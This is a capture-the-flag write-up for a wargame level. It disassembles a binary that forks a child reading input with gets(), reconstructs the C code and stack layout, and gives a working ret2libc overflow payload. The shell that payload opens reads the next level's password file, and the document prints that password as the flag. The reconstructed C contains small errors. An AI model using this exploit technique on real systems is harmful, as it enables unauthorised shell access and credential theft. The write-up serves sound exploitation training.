### notes
```c
0x080486c8  main
```
---
### 0x080486c8 : main() : disassembly
- notebook: (to convert `hex` to `dec` and assign variable names for better reading)
```c
{
	// 0xb  ... 11
	// 0x1c ... 28
	// 0x20 ... 32
	// 0x2c ... 44
	// 0x7f ... 127
	// 0xa0 ... 160
	// 0xa4 ... 164
	// 0xa8 ... 168
	// 0xac ... 172
	// 0xb0 ... 176

	fork_pid   = esp + 172 // 0xac
	buff1      = esp + 32  // 0x20
	ptrace_ret = esp + 168 // 0xa8
	status     = esp + 28  // 0x1c
}
```
- **`<+0> ➜ <+6> : prepare stack frame for main function with size 32`**
```c
0x080486c8 <+0>:	push   ebp
0x080486c9 <+1>:	mov    ebp,esp
0x080486cb <+3>:	push   edi
0x080486cc <+4>:	push   ebx
0x080486cd <+5>:	and    esp,0xfffffff0
0x080486d0 <+8>:	sub    esp,176
```
- **`<+14> ➜ <+19> : fork a process and put the returned PID in fork_pid`**
```c
0x080486d6 <+14>:	call   0x8048550 <fork@plt>
0x080486db <+19>:	mov    DWORD PTR [fork_pid],eax
```
- **`<+26> ➜ <+44> : fill the buff1 buffer with 0, 32 times`**
- **`<+46> : set the ptrace_ret variable to 0`**
- **`<+57> : set the status variable to 0`**
```c
0x080486e2 <+26>:	lea    ebx,[buff1]
0x080486e6 <+30>:	mov    eax, 0
0x080486eb <+35>:	mov    edx, 32
0x080486f0 <+40>:	mov    edi, ebx
0x080486f2 <+42>:	mov    ecx, edx
0x080486f4 <+44>:	rep stos DWORD PTR es:[edi],eax
memset(buff1, 32, 0);
0x080486f6 <+46>:	mov    DWORD PTR [ptrace_ret], 0
0x08048701 <+57>:	mov    DWORD PTR [status], 0
ptrace_ret = 0
status = 0
```

- **`<+65> ➜ <+>155 : verify of fork_pid == 0 , which means its the child process then execute prctl() and ptrace() and gets(buff1) to fill buff1 buffer then quit program with 0`**

```c
0x08048709 <+65>:	cmp    DWORD PTR [fork_pid], 0
0x08048711 <+73>:	jne    0x8048769 <main+161>

0x08048713 <+75>:	mov    DWORD PTR [esp + 4], 1
0x0804871b <+83>:	mov    DWORD PTR [esp], 1
0x08048722 <+90>:	call   0x8048540 <prctl@plt> // prctl(1, 1)


0x08048727 <+95>:	mov    DWORD PTR [esp + 12], 0
0x0804872f <+103>:	mov    DWORD PTR [esp + 8], 0
0x08048737 <+111>:	mov    DWORD PTR [esp + 4], 0
0x0804873f <+119>:	mov    DWORD PTR [esp], 0
0x08048746 <+126>:	call   0x8048570 <ptrace@plt> // ptrace(0, 0, 0, 0)

0x0804874b <+131>:	mov    DWORD PTR [esp],0x8048903 // "Give me some shellcode, k"
0x08048752 <+138>:	call   0x8048500 <puts@plt>
0x08048757 <+143>:	lea    eax,[buff1]
0x0804875b <+147>:	mov    DWORD PTR [esp],eax
0x0804875e <+150>:	call   0x80484b0 <gets@plt>
0x08048763 <+155>:	jmp    0x804881a <main+338>
if (fork_pid == 0) { // child
	prctl(1, 1);
	ptrace(0, 0, 0, 0);
	puts("Give me some shellcode, k");
	gets(buff1);
	return(0); // jump to <main + 338>
}

```
- **`START OF A WHILE LOOP`**
- **`<+161> ➜ <+168> : wait 1 second`**
- **`<+173> ➜ <+226> : make a condition check on status variable to exit if true`**
- **`<+242> ➜ <+296> : compare ptrace(3, fork_pid, 44, 0) to 11 if not equal repeat while , else go kill child process`**
```c
// start of a while 
// do {} while()
0x08048768 <+160>:	nop

0x08048769 <+161>:	lea    eax,[status]
0x0804876d <+165>:	mov    DWORD PTR [esp],eax
0x08048770 <+168>:	call   0x80484f0 <wait@plt>
wait(status);

0x08048775 <+173>:	mov    eax,DWORD PTR [status]
0x08048779 <+177>:	mov    DWORD PTR [esp + 160],eax
0x08048780 <+184>:	mov    eax,DWORD PTR [esp + 160]
0x08048787 <+191>:	and    eax,127
0x0804878a <+194>:	test   eax,eax
0x0804878c <+196>:	je     0x80487ac <main+228>
if (status & 127 == 0)
	jump to main+228
0x0804878e <+198>:	mov    eax,DWORD PTR [status]
0x08048792 <+202>:	mov    DWORD PTR [esp + 164],eax
0x08048799 <+209>:	mov    eax,DWORD PTR [esp + 164]
0x080487a0 <+216>:	and    eax, 127
0x080487a3 <+219>:	add    eax, 1
0x080487a6 <+222>:	sar    al,1 // shift arithmetic right, [100110[] => [110011]  cl = [0], EQUALS TO devision by 2
0x080487a8 <+224>:	test   al,al
0x080487aa <+226>:	jle    0x80487ba <main+242> // <=
if ( (status & 127) + 1 / 2 <= 0)
	jump to main+241
else
	keep to main+228
0x080487ac <+228>:	mov    DWORD PTR [esp],0x804891d // "child is exiting..."
0x080487b3 <+235>:	call   0x8048500 <puts@plt>
0x080487b8 <+240>:	jmp    0x804881a <main+338>
if ((status & 127 == 0) || (status & 127) + 1 / 2 > 0) {
	puts("child is exiting...");
	return (0);
}

0x080487ba <+242>:	mov    DWORD PTR [esp + 12], 0
0x080487c2 <+250>:	mov    DWORD PTR [esp + 8], 44
0x080487ca <+258>:	mov    eax,DWORD PTR [fork_pid]
0x080487d1 <+265>:	mov    DWORD PTR [esp + 4],eax
0x080487d5 <+269>:	mov    DWORD PTR [esp], 3
0x080487dc <+276>:	call   0x8048570 <ptrace@plt>
0x080487e1 <+281>:	mov    DWORD PTR [ptrace_ret],eax
0x080487e8 <+288>:	cmp    DWORD PTR [ptrace_ret], 11
0x080487f0 <+296>:	jne    0x8048768 <main+160>
if (ptrace(3, fork_pid, 44, 0) != 11) {
	jump to main+160
	the condition of the while
}
```
- **`<+302> ➜ <+332> : print a message and kill the forked process by its PID address`**
```c
0x080487f6 <+302>:	mov    DWORD PTR [esp],0x8048931 // "no exec() for you"
0x080487fd <+309>:	call   0x8048500 <puts@plt>
puts("no exec() for you")
0x08048802 <+314>:	mov    DWORD PTR [esp + 4], 9
0x0804880a <+322>:	mov    eax,DWORD PTR [fork_pid]
0x08048811 <+329>:	mov    DWORD PTR [esp],eax
0x08048814 <+332>:	call   0x8048520 <kill@plt>
kill(fork_pid, 9);
```
- **`<+337> ➜ <+349> : return with 0`**
```c
0x08048819 <+337>:	nop
0x0804881a <+338>:	mov    eax, 0
0x0804881f <+343>:	lea    esp,[ebp - 8]
0x08048822 <+346>:	pop    ebx
0x08048823 <+347>:	pop    edi
0x08048824 <+348>:	pop    ebp
0x08048825 <+349>:	ret
return(0);
```

### Code Prediction
```c
int main(int argc(ebp + 8), char **argv(ebp+12)) {

	pid_t fork_pid
	char* buff1[128]
	int ptrace_ret
	int status     

	fork_pid = fork();
	memset(buff1, 32, 0);
	ptrace_ret = 0
	status = 0

	if (fork_pid == 0){
		prctl(1, 1);
		ptrace(0, 0, 0, 0);
		puts("Give me some shellcode, k");
		gets(buff1);
		return (0)
	} 

	do {

		wait(status);

		if ((status & 127 == 0) || (status & 127) + 1 >> 1 > 0) {
			puts("child is exiting...");
			return (0);
		}

	} while (ptrace(3, fork_pid, 44, 0) != 11)

	puts("no exec() for you");
	kill(fork_pid, 9);

	return(0);
}
```

### Stack Illustration

```c
+-------------------+
|      **argv       |
|-------------------| +12
|        argc       |
|-------------------| +8
|ret addr (OLD_EIP) |
|-------------------| +4
|      OLD_EBP      |
|-------------------| <--- EBP (ESP+176)
|                   | 
|-------------------| ESP + 172 fork_pid
|                   |
|-------------------| ESP + 168 ptrace_ret
|                   |
|-------------------| ESP + 164 tmp2
|                   |
|-------------------| ESP + 160 tmp
|                   |
|-------------------|
|                   |
|-------------------| ESP + 32  buff1 (128 bytes)
|                   |
|-------------------| ESP + 28  status
|                   |
|-------------------|
|                   |
+-------------------+ <--- ESP

```

### Process of the Exploit
- the code fork a chill process
- there is a `gets(buffer)` in the child process
- we can exploit a buffer overflow with that gets
---

### Solution :

- Payload : **`(A * 156 + system + exit + "/bin/sh/")`**
	- find the address of system
		```
		(gdb) p system
		$1 = {<text variable, no debug info>} 0xf7e6aed0 <system>
		```
		**0xf7e6aed0**
	- find the address of exit
		```
		(gdb) p exit
		$2 = {<text variable, no debug info>} 0xf7e5eb70 <exit>
		(gdb)
		```
		**0xf7e5eb70**
	- find the address of "/bin/sh"
		```
		(gdb) find system, +9999999, "/bin/sh"
		0xf7f897ec
		warning: Unable to access target memory at 0xf7fd3b74, halting search.
		1 pattern found.
		(gdb) x/s 0xf7f897ec
		0xf7f897ec:	 "/bin/sh"
		(gdb)
		```
		**0xf7f897ec**
- **`(python -c 'print "A" * 156 + "\xd0\xae\xe6\xf7" + "\x70\xeb\xe5\xf7" + "\xec\x97\xf8\xf7" '; cat -) | ./level04`**
- 
	```shell
	level04@OverRide:~$ (python -c 'print "A" * 156 + "\xd0\xae\xe6\xf7" + "\x70\xeb\xe5\xf7" + "\xec\x97\xf8\xf7" '; cat -) | ./level04
	Give me some shellcode, k
	pwd
	/home/users/level04
	whoami
	level05
	cat /home/users/level05/.pass
	3v8QLcN5SAhPaZZfEasfmXdwyR59ktDEMAwHF3aN
	```
|**`flag : 3v8QLcN5SAhPaZZfEasfmXdwyR59ktDEMAwHF3aN`**
---

### Ressources :
- **_["fork" function in c](https://man7.org/linux/man-pages/man2/fork.2.html)_**
- **_["prctl" function in c](https://man7.org/linux/man-pages/man2/prctl.2.html)_**
- **_["ptrace" function in c](https://man7.org/linux/man-pages/man2/ptrace.2.html)_**
- **_["ptrace" function in c](https://man7.org/linux/man-pages/man2/ptrace.2.html)_**
- **_["sar" instruction in assembley](http://www.c-jump.com/CIS77/ASM/Flags/F77_0160_sar_instruction.htm)_**

